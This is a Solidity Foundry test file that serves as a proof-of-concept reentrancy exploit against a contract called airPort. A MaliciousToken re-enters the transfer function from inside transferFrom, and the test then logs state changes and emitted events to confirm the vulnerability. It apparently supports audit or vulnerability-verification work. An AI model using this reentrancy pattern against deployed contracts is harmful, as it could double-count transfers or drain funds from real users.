// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x4b71ad9c1a84b9b643aa54fdd66e2dec96e8b152.sol";

contract MaliciousToken {
    bool private reentered = false;
    address private target;
    uint private constant REENTRATION_AMOUNT = 1 ether;
    address private constant RECIPIENT = address(0x01);

    constructor(address _target) {
        target = _target;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        if (!reentered) {
            reentered = true;
            address[] memory recipients = new address[](1);
            recipients[0] = RECIPIENT;
            airPort(target).transfer(msg.sender, address(this), recipients, REENTRATION_AMOUNT);
        }
        return true;
    }
}

contract ReentrancyTest is Test {
    airPort public port;
    MaliciousToken public maliciousToken;
    address attacker = makeAddr("attacker");
    uint private constant INITIAL_VALUE = 1 ether;
    
    function setUp() public {
        port = new airPort();
        maliciousToken = new MaliciousToken(address(port));
    }

    function testTransferReentrancy() public {
        vm.startPrank(attacker);
        address[] memory recipients = new address[](1);
        recipients[0] = address(0x02);
        
        // Record state before critical operation
        console2.log("--- BEFORE-Trigger Transfer ---");
        uint256 preTotalTransfers = port.totalTransfers(attacker);
        uint256 preUserTokenTransfers = port.userTokenTransfers(attacker, address(maliciousToken));
        console2.log("preTotalTransfers:", preTotalTransfers);
        console2.log("preUserTokenTransfers:", preUserTokenTransfers);
        
        console2.log("--- Trigger Transfer ---");
        // Start recording logs
        vm.recordLogs();
        port.transfer(attacker, address(maliciousToken), recipients, INITIAL_VALUE);
        vm.stopPrank();
        
        console2.log("--- AFTER-Trigger Transfer ---");
        // Record state after critical operation
        uint256 postTotalTransfers = port.totalTransfers(attacker);
        uint256 postUserTokenTransfers = port.userTokenTransfers(attacker, address(maliciousToken));
        console2.log("postTotalTransfers:", postTotalTransfers);
        console2.log("postUserTokenTransfers:", postUserTokenTransfers);
        
        // Calculate state differences
        uint256 totalTransferChange = postTotalTransfers - preTotalTransfers;
        uint256 tokenTransferChange = postUserTokenTransfers - preUserTokenTransfers;
        
        console2.log("State Change Verification:");
        console2.log("- Total Transfers Change (expected 2):", totalTransferChange);
        console2.log("- Token Transfers Change (expected", 2 * INITIAL_VALUE, "):", tokenTransferChange);
        
        // Count emitted BulkTransfer events
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 bulkTransferEventSig = keccak256("BulkTransfer(address,address,uint256,uint256)");
        uint eventCount = 0;
        
        for (uint i = 0; i < logs.length; i++) {
            if (logs[i].topics[0] == bulkTransferEventSig) {
                eventCount++;
            }
        }
        console2.log("Event Count:", eventCount);

        // Vulnerability verification based on state changes and events
        bool vulnerable = (eventCount == 2) && 
                          (totalTransferChange == 2) && 
                          (tokenTransferChange == 2 * INITIAL_VALUE);
                          
        if (vulnerable) {
            console2.log("Vulnerability Exists: Reentrancy attack succeeded as transfer counts and amounts changed unexpectedly");
        } else {
            console2.log("Vulnerability not Exist: State changes and events match expected behavior");
        }
        
        // Original assertions remain for test correctness
        assertEq(eventCount, 2, "Reentrancy not detected");
    }
}